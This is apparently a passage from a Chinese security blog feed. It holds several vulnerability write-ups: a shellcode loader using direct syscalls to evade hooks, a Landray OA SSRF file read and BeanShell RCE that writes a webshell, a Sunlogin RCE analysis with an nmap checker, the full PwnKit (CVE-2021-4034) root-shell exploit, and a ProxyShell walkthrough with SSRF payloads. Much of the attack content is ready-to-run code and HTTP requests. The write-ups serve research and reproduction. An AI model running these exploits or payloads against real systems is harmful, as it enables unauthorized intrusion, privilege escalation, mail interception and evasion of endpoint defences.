&quot;\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff&quot;        &quot;\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb&quot;        &quot;\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c&quot;        &quot;\x63\x2e\x65\x78\x65\x00&quot;;    size_t size = sizeof(buf);    void* sc = NULL;    NtAllocateVirtualMemory(GetCurrentProcess(), &amp;sc, 0,&amp;size,MEM_RESERVE |  MEM_COMMIT, PAGE_EXECUTE_READWRITE);    if (sc == NULL)    {        return 0;    }    memcpy(sc, buf, sizeof(buf));    (*(int(*)()) sc)();    return 0;}</code></pre><p>生成依赖项勾上masm<br><img src="https://s1.ax1x.com/2022/04/09/LCzddf.png" alt=""><br><img src="https://s1.ax1x.com/2022/04/09/LCzwo8.png" alt=""></p><p>注意事项：size传入NtAllocateVirtualMemory会被修改。不要在memcpy的时候重用 原因是内存在分配的时候会向上取整，比如：比如1500大小的，会分配个2000。重用size变量后会造成memcpy将shellcode拷贝到内存的时大小与数组不符，造成越界读到外边去了<br>造成shellcode运行失败<br><img src="https://s1.ax1x.com/2022/04/09/LCzrWQ.png" alt=""></p><p>现成的一些生成syscall的工具，自动生成asm和c文件</p><pre><code>Syswhispers2 与 Syswhispers 最大的不同在于 Syswhispers2 不再需要指定 Windows 版本，也不再依赖于以往的系统调用表，而是采用了系统调用地址排序的方法，也就是这篇 Bypassing User-Mode Hooks and Direct Invocation of System Calls for Red Teams。其具体含义是先解析 Ntdll.dll 的 导出地址表 EAT，定位所有以 “Zw” 开头的函数，将开头替换成 “Nt”，将 Code stub 的 hash 和地址存储在 SYSCALL_ENTRY 结构的表中，存储在表中的系统调用的索引是SSN（System Service Numbers，系统服务编号）。</code></pre><p><a href="https://github.com/jthuraisamy/SysWhispers2" target="_blank" rel="noopener">https://github.com/jthuraisamy/SysWhispers2</a><br><img src="https://s1.ax1x.com/2022/04/09/LCzszj.png" alt=""></p><p>将头文件、asm文件、syscall.c导入项目即可<br>syscall.c改为syscall.cpp引入syscall.h<br><img src="https://s1.ax1x.com/2022/04/09/LCzcyn.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.anquanke.com/post/id/261582#h3-9" target="_blank" rel="noopener">https://www.anquanke.com/post/id/261582#h3-9</a><br><a href="https://www.ddosi.org/b302/" target="_blank" rel="noopener">https://www.ddosi.org/b302/</a><br><a href="https://cloud.tencent.com/developer/article/1922129" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1922129</a><br><a href="https://lengjibo.github.io/syscall/" target="_blank" rel="noopener">https://lengjibo.github.io/syscall/</a></p>]]></content>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>蓝凌OA前台SSRF+dataxml.jsp RCE漏洞分析</title>
      <link href="/posts/980cff8b.html"/>
      <url>/posts/980cff8b.html</url>
      <content type="html"><![CDATA[<h2 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h2><p>漏洞路径:/sys/ui/extend/varkind/custom.jsp<br><img src="https://s4.ax1x.com/2022/03/03/btekb6.png" alt=""></p><pre><code>&lt;c:import&gt;标签提供了所有&lt;jsp:include&gt;行为标签所具有的功能，同时也允许包含绝对URL。举例来说，使用&lt;c:import&gt;标签可以包含一个FTP服务器中不同的网页内容。url：待导入资源的URL，可以是相对路径和绝对路径，并且可以导入其他主机资源&lt;c:param&gt; 标签用于在 &lt;c:url&gt; 标签中指定参数，而且与 URL 编码相关。在 &lt;c:param&gt; 标签内，name 属性表明参数的名称，value 属性表明参数的值。</code></pre><p>利用SSRF读文件</p><pre><code>POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1Host: 1.1.1.1Content-Length: 42Pragma: no-cacheCache-Control: no-cacheOrigin: http://1.1.1.1Upgrade-Insecure-Requests: 1DNT: 1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://1.1.1.1/sys/ui/extend/varkind/custom.jspAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: JSESSIONID=060EB9D7EC3DA6E910B89F3D67BAB52CConnection: closevar={&quot;body&quot;:{&quot;file&quot;:&quot;file:///etc/passwd&quot;}}</code></pre><p><img src="https://s4.ax1x.com/2022/03/03/bteRz9.png" alt=""></p><h2 id="利用dataxml-jsp任意执行代码"><a href="#利用dataxml-jsp任意执行代码" class="headerlink" title="利用dataxml.jsp任意执行代码"></a>利用dataxml.jsp任意执行代码</h2><p>参考链接:<a href="https://websecuritys.cn/archives/lanling2.html" target="_blank" rel="noopener">https://websecuritys.cn/archives/lanling2.html</a><br><a href="https://blog.csdn.net/ouyang111222/article/details/48474189" target="_blank" rel="noopener">https://blog.csdn.net/ouyang111222/article/details/48474189</a></p><p>POC</p><pre><code>POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1Host: 127.0.0.1User-Agent: Go-http-client/1.1Content-Length: 526Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzipvar={&quot;body&quot;:{&quot;file&quot;:&quot;/sys/common/dataxml.jsp&quot;}}&amp;s_bean=sysFormulaValidate&amp;script=import%20java.lang.*;import%20java.io.*;Class%20cls=Thread.currentThread().getContextClassLoader().loadClass(&quot;bsh.Interpreter&quot;);String%20path=cls.getProtectionDomain().getCodeSource().getLocation().getPath();File%20f=new%20File(path.split(&quot;WEB-INF&quot;)[0]%2B&quot;/loginx.jsp&quot;);f.createNewFile();FileOutputStream%20fout=new%20FileOutputStream(f);fout.write(new%20sun.misc.BASE64Decoder().decodeBuffer(&quot;aGVsbG8=&quot;));fout.close();&amp;type=int&amp;modelName=test</code></pre><p>获取s_bean参数值做分割然后进入循环调用getBean函数(getBean获取实例化的bean的id或者name，定义在xml文件)，最后调用getDataList函数传入RequestContext<br><img src="https://s4.ax1x.com/2022/03/03/btejsI.png" alt=""></p><p>s_bean=sysFormulaValidate，搜索sysFormulaValidate<br><img src="https://s4.ax1x.com/2022/03/03/btmCFS.png" alt=""></p><p>在spring.xml可以看见<br><img src="https://s4.ax1x.com/2022/03/03/btmFzj.md.png" alt=""></p><p>找到对应的jar包，对着getDataList按两下shift。定位到IXMLDataBean.class<br><img src="https://s4.ax1x.com/2022/03/03/btmAQs.png" alt=""></p><p>找到接口<br><img src="https://s4.ax1x.com/2022/03/03/btmee0.png" alt=""><br><img src="https://s4.ax1x.com/2022/03/03/btmKFU.png" alt=""><br><img src="https://s4.ax1x.com/2022/03/03/btm3l9.png" alt=""></p><p>可以看到先获取了script参数，然后调用parseValueScript函数<br><img src="https://s4.ax1x.com/2022/03/03/btmaFO.png" alt=""></p><p>继续往下跟<br><img src="https://s4.ax1x.com/2022/03/03/btmr6A.png" alt=""></p><p>首先判断了script是否为NULL，不为NULL去结尾去特殊字符和空格。然后判断是否存在$，如果存在则进入while循环去除$<br><img src="https://s4.ax1x.com/2022/03/03/btmsOI.md.png" alt=""><br><img src="https://s4.ax1x.com/2022/03/03/btmgTf.png" alt=""></p><p>最后拼接，然后调用interpreter.eval()<br>bsh(BeanShell)动态执行java代码：<a href="https://blog.csdn.net/ouyang111222/article/details/48474189" target="_blank" rel="noopener">https://blog.csdn.net/ouyang111222/article/details/48474189</a><br><img src="https://s4.ax1x.com/2022/03/03/btmoXn.png" alt=""><br><img src="https://s4.ax1x.com/2022/03/03/btn0EV.png" alt=""></p><p>利用写文件 getshell</p><pre><code>import%20java.lang.*;import%20java.io.*;Class%20cls=Thread.currentThread().getContextClassLoader().loadClass(&quot;bsh.Interpreter&quot;);String%20path=cls.getProtectionDomain().getCodeSource().getLocation().getPath();File%20f=new%20File(path.split(&quot;WEB-INF&quot;)[0]%2B&quot;/loginx.jsp&quot;);f.createNewFile();FileOutputStream%20fout=new%20FileOutputStream(f);fout.write(new%20sun.misc.BASE64Decoder().decodeBuffer(&quot;aGVsbG8=&quot;));fout.close();</code></pre><p>为什么loginxx.jsp访问是200,spring.xml允许匿名访问的如下<br><img src="https://s4.ax1x.com/2022/03/03/btuSPS.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>向日葵RCE漏洞复现分析</title>
      <link href="/posts/c5ac22a4.html"/>
      <url>/posts/c5ac22a4.html</url>
      <content type="html"><![CDATA[<p>复现基本参考：space老哥的《向日葵远程命令执行漏洞分析》</p><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p>漏洞范围：小于或等于11.x<br>复现的版本：11.0.0.33162<br><img src="https://s4.ax1x.com/2022/02/17/HIjjRU.png" alt=""></p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>这里跟踪了check接口、路由接口、认证接口这三个<br>首先脱壳，向日葵加了UPX，upx -d脱掉即可<br><img src="https://s4.ax1x.com/2022/02/17/HIvCZR.png" alt=""></p><p>向日葵对应的端口，找到SunloginService服务的PID在找端口即可<br><img src="https://s4.ax1x.com/2022/02/17/HIviIx.png" alt=""></p><p>向日葵在启动的时候会开启该服务，端口绑定在服务里（没更）。向日葵的端口大概是<strong>4w-5w</strong><br><img src="https://s4.ax1x.com/2022/02/17/HIvERO.png" alt=""></p><p>根据PDF里的先获取CID才能后续利用，open IDA shift+F12搜索CID<br><img src="https://s4.ax1x.com/2022/02/17/HIveQe.png" alt=""></p><p>（先连接一次向日葵然后在log里可以看到CID，对应log位置：SunloginClient\log\sunlogin_service.&lt;日期&gt;.log）<br><img src="https://s4.ax1x.com/2022/02/17/HIv1FP.png" alt=""></p><p>根据PDF里的访问/cgi-bin/rpc可以未授权获取到CID。找到路由可以看到对应的处理函数(sub_140E216BA-&gt;找到该函数的方法上面提到的搜索CID字符串跟入其中一个函数在上级便是路由)<br>（懒得截图了，处理函数是sub_140E1C954）<br><img src="https://s4.ax1x.com/2022/02/17/HIvJSS.png" alt=""></p><p>当满足action=verify-haras会返回verify_string而和CID对比两者一致<br><img src="https://s4.ax1x.com/2022/02/17/HIvaes.png" alt=""><br><img src="https://s4.ax1x.com/2022/02/17/HIvBF0.png" alt=""></p><p>当为action为fast-login，是识别码和本地验证码的处理，认证成功后也可以获取CID<br><img src="https://s4.ax1x.com/2022/02/17/HIvrWT.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/02/17/HIvcy4.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/02/17/HIv5Y6.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/02/17/HIx64P.png" alt=""></p><p>参数需要:action=fast-login&amp;fastcode=&lt;本地识别码&gt;&amp;verify_string=&lt;本地验证码&gt;&amp;use_custom_password=1<br><img src="https://s4.ax1x.com/2022/02/19/HHxec6.png" alt=""></p><p>也可以通过login.cgi验证获取CID<br><img src="https://s4.ax1x.com/2022/02/19/HHx34A.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/02/17/HIzPC6.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/02/17/HIzi8K.png" alt=""></p><p><strong>check接口RCE</strong><br>获取cmd值后，判断是否存在ping命令然后跳到LABEL_27，调用sub_140E20B64执行命令<br><img src="https://s4.ax1x.com/2022/02/17/HIzVDH.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/02/17/HIztVs.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/02/19/HHxkN9.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/02/17/HIzBxU.png" alt=""></p><p><strong>认证接口</strong><br>回到路由，跟踪上一级（或者搜索:{“success”:false,”msg”:”Verification failure”}定位）<br><img src="https://s4.ax1x.com/2022/02/17/HIzgaR.png" alt=""></p><p>可以看到判断cookie是否存在和CID的赋值，最后传入v132判断CID是否正确<br><img src="https://s4.ax1x.com/2022/02/17/HIzWPx.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/02/17/HIzHZd.png" alt=""></p><p>如果是请求路径是下面其中一个则会进入到sub_14061D284（也就是刚刚的路由）<br><img src="https://s4.ax1x.com/2022/02/17/HIzXJP.png" alt=""></p><p>nmap检测脚本：</p><pre><code class="lua">local http=require &quot;http&quot;local shortport=require &quot;shortport&quot;local stdnse=require &quot;stdnse&quot;local string=require &quot;string&quot;local vulns=require &quot;vulns&quot;local json=require &quot;json&quot;portrule=function(host,port)        if (port.state==&quot;open&quot;) and (port.protocol==&quot;tcp&quot;) then                return true        endendaction=function(host,port)        local status=stdnse.output_table()        local url=string.format(&quot;http://%s:%s&quot;,host.ip,port.number)        local banner=&quot;{\&quot;success\&quot;:false,\&quot;msg\&quot;:\&quot;Verification failure\&quot;}&quot;        local headers={header={}}        headers[&quot;header&quot;][&quot;User-Agent&quot;]=&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0&quot;        local rqt=http.get_url(url,headers)        if (rqt.status==200) and (string.match(rqt.body,banner)) then                status.banner=&quot;SunloginClient&quot;                local uri=&quot;/cgi-bin/rpc&quot;                local postdata=&quot;action=verify-haras&quot;                local cid_check=http.post(host,port,uri,nil,true,postdata)                if(cid_check.status==200) then                        local json_check,json_data=json.parse(cid_check.body)                        if (json_data[&quot;enabled&quot;]==&quot;1&quot;) then                                status.rce=&quot;YES&quot;                                status.cid=json_data[&quot;verify_string&quot;]                        end                end                if (status~=nil) then                        return status                end        endend</code></pre><p><img src="https://s4.ax1x.com/2022/02/17/HoSpLQ.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>pkexec提权漏洞复现</title>
      <link href="/posts/2b1cd54.html"/>
      <url>/posts/2b1cd54.html</url>
      <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>2022-01-25，CVE-2021-4034利用详情发布，该漏洞是Qualys研究团队在polkit的pkexec中发现的一个内存损坏漏洞，允许非特权用户获取root权限。根据作者的发布文章说，在默认安装的Ubuntu、Debian、Fedora和CentOS上都已经成功复现。这个漏洞已经隐藏了12年多，并影响自2009年5月第一个版本以来的所有pkexec版本：（commit c8c3d83，“Add a pkexec(1) command”）<br><img src="https://s4.ax1x.com/2022/01/28/7x4Dte.png" alt=""></p><h2 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h2><p>1.存在pkexec命令<br>2.pkexec在suid里<br><img src="https://s4.ax1x.com/2022/01/28/7x5q8H.png" alt=""></p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>全”环境变量（例如 LD_PRELOAD）放在 pkexec 的 环境; 如果是正常设置环境变量，这些“不安全”变量通常会被删除（通过 ld.so），如GCONV_PATH就是不安全的环境变量，因为他会导致任意so执行。同时pkexec是一个默认具有suid<br>属性的程序，如果能让其执⾏命令，那么就能导致suid提权了。所以利⽤中允许我们绕过过滤写⼊GCONV_PATH，然后设置gconv-modules文件，触发字符集转换，调用iconv_open加载对应字符集的so文件。</p><p>534行：for循环argc=0，所以不会进入循环，但n已经设置成1<br>610行：argv[1]赋值给path<br><img src="https://s4.ax1x.com/2022/01/28/7xIBzd.png" alt=""><br><img src="https://s4.ax1x.com/2022/01/28/7xIrQA.png" alt=""><br><img src="https://s4.ax1x.com/2022/01/28/7xIfJg.png" alt=""></p><p>因为argv和envp指针在内存中是连续的，如果argc为0，那么越界argv[1]实际上是envp[0]<br><img src="https://s4.ax1x.com/2022/01/28/7xIbwV.png" alt=""></p><p>如果按照上面的代码逻辑，如果传⼊的命令不是绝对路径，就会在 PATH 环境变量的目录搜索，在赋<br>值回argv</p><p>假设我们执行pkexec，此时argc=0，envp={“xxx”}<br>610行，程序会读取argv[1]到path变量中，也就是”xxx”<br>632行，s = g_find_program_in_path (path)找到该程序的绝对路径，假设为/usr/bin/xxx<br>639行，程序将s写入argv[1]和path，从而覆盖了第一个环境变量。此时envp也就变成了{“/usr/bin/xxx”}<br><img src="https://s4.ax1x.com/2022/01/28/7xoAYD.png" alt=""></p><p>根据找到的函数进行寻找利用：<br>在pkexec中多次使用了g_printerr()函数，该函数是调用GLib的函数。但是如果环境变量CHARSET不是UTF-8，g_printerr()将会调用glibc的函数iconv_open()，来将消息从UTF-8转换为另一种格式。<br>iconv_open函数的执行过程为：iconv_open函数首先会找到系统提供的gconv-modules配置文件，这个文件中包含了各个字符集的相关信息存储的路径，每个字符集的相关信息存储在一个.so文件中，即gconv-modules文件提供了各个字符集的.so文件所在位置，之后会调用.so文件中的gconv()与gonv_init()函数。<br>如果我们改变了系统的GCONV_PATH环境变量，也就能改变gconv-modules配置文件的位置，从而执行一个恶意的so文件实现任意命令执行。</p><p><strong>argv[n] = path=s就能重新触发环境变量加载，因为g_printerr()将会调用glibc的函数iconv_open()利用环境变量重新定义了GCONV_PATH，最后找到自己定义的so。加载了gconv_init函数，最后由于又是SUID权限实现了提权其实就是类似于DLL劫持</strong></p><p>CVE-2021-4034</p><pre><code class="c">/** Proof of Concept for PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit’s pkexec (CVE-2021-4034) by Andris Raugulis &lt;moo@arthepsy.eu&gt;* Advisory: https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034*/#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;char *shell =    &quot;#include &lt;stdio.h&gt;\n&quot;    &quot;#include &lt;stdlib.h&gt;\n&quot;    &quot;#include &lt;unistd.h&gt;\n\n&quot;    &quot;void gconv() {}\n&quot;    &quot;void gconv_init() {\n&quot;    &quot;    setuid(0); setgid(0);\n&quot;    &quot;    seteuid(0); setegid(0);\n&quot;    &quot;    system(\&quot;export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf &#39;GCONV_PATH=.&#39; &#39;pwnkit&#39;; /bin/sh\&quot;);\n&quot;    &quot;    exit(0);\n&quot;    &quot;}&quot;;int main(int argc, char *argv[]) {    FILE *fp;    system(&quot;mkdir -p &#39;GCONV_PATH=.&#39;; touch &#39;GCONV_PATH=./pwnkit&#39;; chmod a+x &#39;GCONV_PATH=./pwnkit&#39;&quot;);    system(&quot;mkdir -p pwnkit; echo &#39;module UTF-8// PWNKIT// pwnkit 2&#39; &gt; pwnkit/gconv-modules&quot;);    fp = fopen(&quot;pwnkit/pwnkit.c&quot;, &quot;w&quot;);    fprintf(fp, &quot;%s&quot;, shell);    fclose(fp);    system(&quot;gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC&quot;);    char *env[] = { &quot;pwnkit&quot;, &quot;PATH=GCONV_PATH=.&quot;, &quot;CHARSET=PWNKIT&quot;, &quot;SHELL=pwnkit&quot;, NULL };    execve(&quot;/usr/bin/pkexec&quot;, (char*[]){NULL}, env);}</code></pre><p><img src="https://s4.ax1x.com/2022/01/28/7xo3tS.png" alt=""></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>新版pkexec已修复了漏洞 (更新pkexec)<br><img src="https://s4.ax1x.com/2022/01/28/7xot6s.png" alt=""></li><li>取消pkexec SUID权限</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://saucer-man.com/information_security/876.html" target="_blank" rel="noopener">https://saucer-man.com/information_security/876.html</a></p>]]></content>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Exchange ProxyShell漏洞复现</title>
      <link href="/posts/e4d494fa.html"/>
      <url>/posts/e4d494fa.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这周复现了proxyshell这个漏洞，一直嫌麻烦没弄。跟dll跟了两天终于弄明白了</p><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>影响的漏洞版本：Exchange&gt;9 &lt;=23</p><pre><code>Microsoft Exchange Server 2019 Cumulative Update 9Microsoft Exchange Server 2019 Cumulative Update 8Microsoft Exchange Server 2016 Cumulative Update 20Microsoft Exchange Server 2016 Cumulative Update 19Microsoft Exchange Server 2013 Cumulative Update 23</code></pre><p>漏洞介绍:</p><pre><code>* CVE-2021-34473 - 一个ssrf漏洞* CVE-2021-34523 - Exchange PowerShell BackEnd提权* CVE-2021-31207 - 认证后任意文件写入漏洞</code></pre><p>利用的本质就是在前台服务中存在校验缺失，导致外面发起的请求可以以前台服务的进程作为跳板进行后台服务资源的访问。<br><img src="https://s4.ax1x.com/2022/01/22/7WBmb6.png" alt=""></p><p>前台服务<br><img src="https://s4.ax1x.com/2022/01/22/7WBHqx.png" alt=""></p><p>后台服务<br><img src="https://s4.ax1x.com/2022/01/22/7WDFdf.png" alt=""></p><p>444端口是system权限<br><img src="https://s4.ax1x.com/2022/01/22/7WDnQs.png" alt=""><br><img src="https://s4.ax1x.com/2022/01/22/7WDuyn.png" alt=""></p><h2 id="漏洞原理分析与复现"><a href="#漏洞原理分析与复现" class="headerlink" title="漏洞原理分析与复现"></a>漏洞原理分析与复现</h2><p>这次涉及到的DLL</p><pre><code>* Microsoft.Exchange.FrontEndHttpProxy.dll* Microsoft.Exchange.HttpProxy.Common.dll* Microsoft.Exchange.Configuration.RemotePowershellBackendCmdletProxyModule.dll</code></pre><p><strong>CVE-2021-34473</strong><br>Exchange主要路由是在Microsoft.Exchange.FrontEndHttpProxy.dll里的SelectHandlerForUnauthenticateRequest函数里,该函数对处理不同请求路径的服务进行处理。<br><img src="https://s4.ax1x.com/2022/01/22/7WDUyR.png" alt=""></p><p>AutodiscoverProxyRequestHandler函数实现：</p><pre><code>=&gt; 实现 EwsAutodiscoverProxyRequestHandler  =&gt; 实现 BEServerCookieProxyRequestHandler   =&gt; 实现 ProxyRequestHandler</code></pre><p><img src="https://s4.ax1x.com/2022/01/22/7WDaO1.png" alt=""></p><p>ProxyRequestHandler调用了GetTargetBackEndServerUrl函数<br><img src="https://s4.ax1x.com/2022/01/22/7WDsYD.png" alt=""></p><p>跟下去发现调用了同类里的GetClientUrlForProxy函数 (this.GetClientUrlForProxy=&gt;Microsoft.Exchange.HttpProxy.EwsAutodiscoverProxyRequestHandler.GetClientUrlForProxy())<br><img src="https://s4.ax1x.com/2022/01/22/7WDgld.png" alt=""></p><p>GetClientUrlForProxy函数调用了IsAutodiscoverV2Request检查url<br><img src="https://s4.ax1x.com/2022/01/22/7WDROI.png" alt=""></p><p>IsAutodiscoverV2Request函数，判断url路径是否存在<br><img src="https://s4.ax1x.com/2022/01/22/7WDXmq.png" alt=""></p><p>回到GetTargetBackEndServerUrl，调用RemoveExplicitLogonFromUrlAbsoluteUri函数。传入了个this.explicitLogonAddress参数。跟踪这个参数被谁赋值了。调用了 ResolveAnchorMailbox函数，请求Email参数的值赋予（无论是：GET、POST、COOKIE都可以）<br><img src="https://s4.ax1x.com/2022/01/22/7Wric9.png" alt=""><br><img src="https://s4.ax1x.com/2022/01/22/7WrK9e.png" alt=""></p><p>回到ResolveAnchorMailbox函数，如果请求路径中存在于Email参数中，则进行url截取<br><img src="https://s4.ax1x.com/2022/01/22/7WrljA.png" alt=""></p><p>没截取前<br><img src="https://s4.ax1x.com/2022/01/22/7WrGHP.png" alt=""></p><p>截取后<br><img src="https://s4.ax1x.com/2022/01/22/7Wra9g.png" alt=""></p><p>回到ProxyRequestHandler函数继续往下跟踪，设置port为444端口<br><img src="https://s4.ax1x.com/2022/01/22/7Wr0js.png" alt=""><br><img src="https://s4.ax1x.com/2022/01/22/7WrrBq.png" alt=""></p><p>继续动态跟踪下去时，发现到了BeginProxyRequest函数里，去到CreateServerRequest函数。跟入后发现WebRequest初始化传入url。在往下面后就是发送请求然后获取响应<br><img src="https://s4.ax1x.com/2022/01/22/7WrsH0.png" alt=""><br><img src="https://s4.ax1x.com/2022/01/22/7Wrg4U.png" alt=""><br><img src="https://s4.ax1x.com/2022/01/22/7Wrhv9.png" alt=""></p><p>最后结出上面的规则为：</p><pre><code>* url路径必须带有/autodiscover/autodiscover.json或者/autodiscover/autodiscover.json/V1.0* Email参数 带有url路径会被进行截断（Email参数在GET、POST、COOKIE请求都可以）* 最后修改port为444，进行请求获取响应</code></pre><p>payload</p><pre><code>https://100.100.5.217/autodiscover/autodiscover.json?@foo.com/mapi/nspi/?&amp;Email=autodiscover/autodiscover.json%3f@foo.com</code></pre><p>出现以下页面则代表存在SSRF漏洞 (SYSTEM权限令牌绕过登录)<br><img src="https://s4.ax1x.com/2022/01/22/7WrXgH.png" alt=""></p><p>直接访问/mapi/nspi/是需要登录的<br><img src="https://s4.ax1x.com/2022/01/22/7Wrjvd.png" alt=""></p><p>利用exchange的autodiscover服务来查找高权限用户的配置文件，我们需要配置文件中的legacyDn属性，这个属性可以帮助我们得到目标用户的sid，如果能得到目标用户sid，我们就可以拥有目标用户的权限来使用ews的api进行恶意炒作例如监听其他用户的邮件。</p><pre><code>POST /autodiscover/autodiscover.json?@foo.com/autodiscover/autodiscover.xml?=&amp;Email=autodiscover/autodiscover.json%3f@foo.com HTTP/1.1Host: 100.100.5.217Connection: closeCache-Control: max-age=0sec-ch-ua: &quot; Not A;Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;96&quot;, &quot;Google Chrome&quot;;v=&quot;96&quot;sec-ch-ua-mobile: ?0sec-ch-ua-platform: &quot;Windows&quot;DNT: 1Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PrivateComputer=true; PBack=0; ClientId=2A9DC075E72B49ED95FAF9498FFD63AE; UC=d7662cac28fe41f5a4c752c0cb96f36f; X-OWA-JS-PSD=1; ASP.NET_SessionId=097f8699-5d46-4849-914f-08bcefbf727c; TimeOffset=-480; Eac_CmdletLogging=false; OutlookSession=d4443a26257741528c97c97f1b718e88; mkt=zh-CN; X-OWA-CANARY=XsK-HxTO_E-jYGE_d3TOoxAwaR2929kIrct9DGPb_7Yh46fL8Zwh9sYZrYS7XO0EM_7_veA6Vtw.Content-Type: text/xmlContent-Length: 370&lt;Autodiscover xmlns=&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006&quot;&gt;        &lt;Request&gt;          &lt;EMailAddress&gt;administrator@yayi.local&lt;/EMailAddress&gt;          &lt;AcceptableResponseSchema&gt;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&lt;/AcceptableResponseSchema&gt;        &lt;/Request&gt;    &lt;/Autodiscover&gt;</code></pre><p><img src="https://s4.ax1x.com/2022/01/22/7Ws9VP.png" alt=""></p><p>用legacyDn属性值请求获取对应用户的SID (利用接口报错获得的SID，需要在legacyDn后面加不可见字符串，具体建议看脚本抓包)</p><pre><code>POST //autodiscover/autodiscover.json?a=mpoak@ldxzf.rgq/mapi/emsmdb HTTP/1.1Host: 192.168.1.106Accept-Encoding: gzip, deflateCookie: Email=autodiscover/autodiscover.json?a=mpoak@ldxzf.rgqX-Requesttype: ConnectX-Clientinfo: {2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}X-Clientapplication: Outlook/15.0.4815.1002X-Requestid: {C715155F-2BE8-44E0-BD34-2960067874C8}:2Content-Type: application/mapi-httpContent-Length: 141Connection: close/o=yayimail/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=36252da5ce5d4b7cbee9eda07b45ab16-pentest</code></pre><p><img src="https://s4.ax1x.com/2022/01/22/7WsZKs.png" alt=""></p><p>根据CVE-2018-8581我们可以知道，如果我们知道某个用户的sid，那么我们就可以模拟这个用户使用SOAP通过ews的api进行各种操作，例如监听其他用户的邮件。但这是远远不够的。我们可以尝试访问Exchange PowerShell Remoting进行RCE攻击。</p><p><strong>CVE-2021-34523分析</strong><br>Exchange PowerShell Remoting是一个基于WSMan协议的一个服务，他可以执行一些特定的powershell命令，实现的功能有发邮件、读邮件、更新配置文件等，使用的前提是使用者需具有邮箱，可是如果我们利用前面的ssrf漏洞来使用system用户的身份使用此服务的话就会失败，原因是system用户是没有邮箱的。因此我们需要解决一个认证问题，使得我们可以以高权限用户的身份去使用这个服务，进而进行后续操作。</p><p>这时候我们有几个难点：</p><pre><code>* 无法通过设置X-CommonAccessToken间接设置CommonAccessToken来伪造自己的身份，因为有黑名单的存在，因此exchange无法通过ssrf将X-CommonAccessToken的值带给backend，因此无法通过这种方法进行身份验证。（没研究为什么）* 想要通过认证必须传递正确的CommonAccessToken给Backend。* 即使我们找到了一个可传递的点，但我们到底传递什么样的CommonAccessToken才能使得exchange 